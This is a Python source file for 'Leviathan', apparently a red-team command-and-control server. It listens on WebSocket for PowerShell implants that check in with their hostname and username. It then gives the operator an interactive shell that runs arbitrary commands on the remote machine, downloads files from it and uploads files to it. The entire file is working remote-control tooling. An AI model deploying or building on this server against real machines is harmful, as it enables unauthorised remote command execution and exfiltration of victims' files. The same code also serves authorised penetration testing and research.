#!/usr/bin/python2.7
#author: @xorrior (Chris Ross)

import os, cmd, sys
from flask import Flask, request, make_response
from gevent import pywsgi
from geventwebsocket.handler import WebSocketHandler
from geventwebsocket import WebSocketServer, WebSocketApplication, Resource
import geventwebsocket
import threading
import argparse
import glob
import base64
import readline
readline.set_completer_delims(' \t\n')

"""
Client Data format
task_id|data
"""
"""
Server Data format
task_id|data
"""

levianthanIntro = '''
______ _____________    _________________ ______________  _________ _____   __
___  / ___  ____/__ |  / /____  _/___    |___  __/___  / / /___    |___  | / /
__  /  __  __/   __ | / /  __  /  __  /| |__  /   __  /_/ / __  /| |__   |/ / 
_  /____  /___   __ |/ /  __/ /   _  ___ |_  /    _  __  /  _  ___ |_  /|  /  
/_____//_____/   _____/   /___/   /_/  |_|/_/     /_/ /_/   /_/  |_|/_/ |_/   
                                                                             
'''
class WebSocket(geventwebsocket.websocket.WebSocket):
    
    def read_message(self):
        opcode = None
        message = ''

        while True:
            header, payload = self.read_frame()
            f_opcode = header.opcode

            if f_opcode in (self.OPCODE_TEXT, self.OPCODE_BINARY):
                # a new frame
                if opcode:
                    raise ProtocolError("The opcode in non-fin frame is "
                                        "expected to be zero, got "
                                        "{0!r}".format(f_opcode))

                # Start reading a new message, reset the validator
                self.utf8validator.reset()
                self.utf8validate_last = (True, True, 0, 0)

                opcode = f_opcode

            elif f_opcode == self.OPCODE_CONTINUATION:
                if not opcode:
                    raise ProtocolError("Unexpected frame with opcode=0")

            elif f_opcode == self.OPCODE_PING:
                self.handle_ping(header, payload)
                continue

            elif f_opcode == self.OPCODE_PONG:
                self.handle_pong(header, payload)
                continue

            elif f_opcode == self.OPCODE_CLOSE:
                self.handle_close(header, payload)
                return

            else:
                raise ProtocolError("Unexpected opcode={0!r}".format(f_opcode))

            if opcode == self.OPCODE_TEXT:
                self.validate_utf8(payload)
                message += payload

            if header.fin:
                break

        if opcode == self.OPCODE_TEXT:
            self.validate_utf8(message)
            return self._decode_bytes(message)
        else:
            return payload

geventwebsocket.websocket.WebSocket = WebSocket

class Leviathan(cmd.Cmd):
	"""Class that will serve as the menu for client interaction and handle client data"""
	def __init__(self, websocket, clientName, clientUser):
		cmd.Cmd.__init__(self)
		self.prompt = "PS %s@%s > " % (clientUser, clientName)
		self.intro = levianthanIntro
		self.do_help.__func__.__doc__ = '''Displays the help menu.'''
		self.ws = websocket
		self.clientName = clientName
		self.clientUser = clientUser

	def preloop(self):
		"""Initialize the history var"""
		cmd.Cmd.preloop(self)
		self._hist = []

	def postloop(self):
		"""Print exiting message"""
		cmd.Cmd.postloop(self)
		print "Exiting websocket session....\n"

	def cmdloop(self, intro=None):
        
		try:
			return cmd.Cmd.cmdloop(self)
		except KeyboardInterrupt:
			self.ws.close()
			sys.exit(0)

	def default(self, line):
		"Default Handler"
		line = line.strip()
		#YOLO send the command to the powershell client
		task = "\x00|"+line
		self.ws.send(task, binary=True)

	def do_download(self, line):
		"""Download a file from the client"""
		line = line.strip()
		task = "\x01|"+line
		self.ws.send(task, binary=True)

	def do_upload(self, line):
		"""Upload a file"""
		line = line.strip()
		if os.path.exists(line):
			task = "\x02|"
			f = open(line, 'r')
			filename = os.path.basename(line)
			data = base64.b64encode(f.read())
			data += "|"+filename
			task += data
			self.ws.send(task, binary=True)
		else:
			print "local file does not exist\n"
			pass

	def do_exit(self, line):
		"""Exit the current WebSocketSession"""
		self.ws.close()

	def emptyline(self):
		pass

	def precmd(self, line):
		"""Add the command to history"""
		self._hist += [ line.strip() ]
		return line

	def postcmd(self, stop, line):
		"""Client result processing"""
		if "help" in line or line == '':
			return stop

		if "exit" in line:
			return True

		returnData = self.ws.receive()
		taskID = returnData[0]
		taskData = returnData[5:]

		if taskID == 0:
			"Process Powershell Cmd"
			try:
				print str(taskData.decode('ascii')) + '\n'
			except Exception:
				pass

			return stop
		elif taskID == 1:
			"Process File Download"
			fileData, fileName = taskData.split('|')
			fileName = fileName.decode('ascii')
			f = open(fileName, 'wb')
			f.write(base64.b64decode(fileData))
			f.close()
			print "File download saved to: "+os.path.abspath(fileName)
			return stop
		elif taskID == 2:
			print "File upload successful\n"
			return stop 
		else:
			print "Task failed to complete\n"
			return stop

	def complete_upload(self, text, line, begidx, endidx):
		"Tab-complete an upload file path"
		"""
		Helper for tab-completion of file paths. Taken directly from Empire
		"""

		# stolen from dataq at
		#   http://stackoverflow.com/questions/16826172/filename-tab-completion-in-cmd-cmd-of-python

		before_arg = line.rfind(" ", 0, begidx)
		if before_arg == -1:
			return # arg not found

		fixed = line[before_arg+1:begidx]  # fixed portion of the arg
		arg = line[before_arg+1:endidx]
		pattern = arg + '*'

		completions = []
		for path in glob.glob(pattern):
			path = _append_slash_if_dir(path)
			completions.append(path.replace(fixed, "", 1))

		return completions


def Controller(environ, start_response):
	"""Server logic"""
	app = Flask(__name__)
	app.secret_key = os.urandom(24)

	if environ["PATH_INFO"] == '/client':
		ws = environ["wsgi.websocket"]
		addr = environ["REMOTE_ADDR"]
		print "Received Upgrade request from: "+addr+", Waiting for check in ...."
		clientMsg = ws.receive()
		#client will always send the hostname, current user with the first message
		clientName, clientUser = clientMsg.split('|')
		shell = Leviathan(ws, clientName, clientUser)
		shell.cmdloop()
		ws.close()
	else:
		return app(environ, start_response)

def main():
	parser = argparse.ArgumentParser(description="Start a Leviathan Server")
	parser.add_argument('--endpoint', help="Specific IP to bind the listener", required=True)
	parser.add_argument('--port', type=int, help="Port to use", required=True)
	parser.add_argument('--certfile', help="path to the cert file to use for SSL. Optional.")

	args = parser.parse_args()

	host = args.endpoint
	port = args.port

	if not args.certfile:
		leviathan_server = WebSocketServer((host, port), Controller)
	else:
		leviathan_server = WebSocketServer((host, port), Controller, certfile=args.certfile)

	try:
		leviathan_server.serve_forever()
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()
							
